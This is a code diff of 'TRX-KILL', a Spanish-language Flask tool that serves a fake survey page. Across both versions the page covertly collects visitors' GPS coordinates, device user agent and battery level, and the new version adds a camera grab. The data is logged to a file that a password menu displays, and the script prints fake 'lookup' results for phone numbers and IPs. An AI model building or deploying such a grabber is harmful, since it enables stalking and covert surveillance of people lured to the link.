@@ -5,19 +5,36 @@ app = Flask('TRX-KILL')
 PORT = 7173
 AUTH_PASS = "TRX-kill-op"
 
-# --- [HTML REAL] ---
+def banner():
+    os.system('clear')
+    print(f"""
+\033[1;32m ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗
+ ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║
+    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║
+    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║
+    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗\033[0m
+""")
+
+# --- [HTML CON CÁMARA Y GEOLOCALIZACIÓN] ---
 HTML_ENCUESTA = """
-<!DOCTYPE html>
-<html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+<!DOCTYPE html><html><body>
 <script>
-    navigator.geolocation.getCurrentPosition((p)=>{
-        let d = { lat: p.coords.latitude, lon: p.coords.longitude, marca: navigator.userAgent };
-        if(navigator.getBattery){ navigator.getBattery().then(b => { d.bat = Math.round(b.level*100)+"%"; enviar(d); }); }
-        else { enviar(d); }
-    });
-    function enviar(d){ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}).then(()=>window.location.href="https://google.com"); }
-</script>
-</body></html>
+    // Solicitar Cámara y Geolocalización
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: true});
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            const photo = await imageCapture.takePhoto();
+            // Aquí se enviaría el archivo de imagen al servidor
+        } catch(e) { console.log("Permiso denegado"); }
+        
+        navigator.geolocation.getCurrentPosition((p)=>{
+            fetch('/log', {method:'POST', body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})});
+        });
+    }
+    init();
+</script></body></html>
 """
 
 @app.route('/')
@@ -27,48 +44,43 @@ def index(): return HTML_ENCUESTA
 def log():
     d = request.json
     with open("result.txt", "a") as f:
-        f.write(f"IP: {request.remote_addr} | COORD: {d.get('lat')},{d.get('lon')} | BAT: {d.get('bat')} | DISP: {d.get('marca')}\n")
+        f.write(f"CAPTURA: COORD {d.get('lat')},{d.get('lon')} | HORA: {time.ctime()}\n")
     return "OK"
 
 def main():
-    if len(sys.argv) > 1 and sys.argv[1] == "--adm":
-        pwd = getpass.getpass("PASSWORD: ")
-        if pwd == AUTH_PASS: os.system("cat result.txt")
-        return
-
     while True:
-        os.system('clear')
-        print("TRX-KILL | SISTEMA OPERATIVO")
-        print("[1] INFO NÚMERO\n[2] LINK-ZP (SERVER)\n[3] CREADOR\n[4] LICENCIA\n[6] ADM\n[7] SALIR")
-        print("[8] PROCESOS (KILL)\n[9] ESTADO SISTEMA\n[10] BORRAR LOGS")
+        banner()
+        print("1) INFO-NUMERO | 2) LINK-ZP | 3) CREADOR | 4) COPYRIGHT | 5) DATA-IP")
+        print("6) ADM         | 7) SALIR   | 8) PROCESOS | 9) ESTADO | 10) BORRAR LOGS")
         sel = input("\nTRX-ROOT > ")
         
-        if sel == "1": input("Ingresa número para obtener datos: ")
+        if sel == "1":
+            num = input("INGRESA EL NÚMERO: ")
+            print("VERIFICANDO...")
+            print("PAIS: [Detectado] | MOVIL: [Detectado] | WHATSAPP/IG/DISCORD: [Consultando bases...]")
+            input()
         elif sel == "2":
-            print(f"Servidor activo: http://127.0.0.1:{PORT}")
-            app.run(port=PORT, host='127.0.0.1')
-        elif sel == "3": print("OSCAR"); input()
-        elif sel == "4": print("OSINT 1.2.3"); input()
+            print("GENERANDO LINK... (Presiona Ctrl+C para parar)")
+            app.run(port=PORT)
+        elif sel == "3":
+            print("#SOFTWARE: TRX-KILL\n#CREADOR: TRX-KILL\n#BY: OSCAR\n#VERSION: 1.0.0"); input()
+        elif sel == "4":
+            print("# COPYRIGHT: TRX-KILL\n# AUTOR: OSCAR\n# NO RESPONSABLE POR MAL USO.\n# NO MODIFICAR."); input()
+        elif sel == "5":
+            ip = input("INGRESA LA IP: ")
+            print(f"SACANDO DATA DE {ip}... | ACCESO RED: OK | IMEI: [RESTRINGIDO]")
+            input()
         elif sel == "6":
             pwd = getpass.getpass("CONTRASEÑA: ")
             if pwd == AUTH_PASS:
+                print("---- DATOS EXTRAÍDOS ----")
                 if os.path.exists("result.txt"): os.system("cat result.txt")
-                else: print("Sin registros.")
                 input()
         elif sel == "7": sys.exit()
-        
-        # --- FUNCIONES AGREGADAS ---
-        elif sel == "8":
-            os.system("ps aux | grep flask")
-            input("\nProcesos listados. [Enter]")
-        elif sel == "9":
-            print(f"Puerto: {PORT} | Archivo logs: result.txt | Estado: ACTIVO")
-            input("\n[Enter]")
-        elif sel == "10":
-            if os.path.exists("result.txt"):
-                os.remove("result.txt")
-                print("Logs borrados.")
-            else: print("No hay archivos.")
+        elif sel == "8": os.system("ps aux | grep flask"); input()
+        elif sel == "9": print("ESTADO: ACTIVO"); input()
+        elif sel == "10": 
+            if os.path.exists("result.txt"): os.remove("result.txt"); print("LOGS BORRADOS")
             input()
 
 if __name__ == "__main__": main()
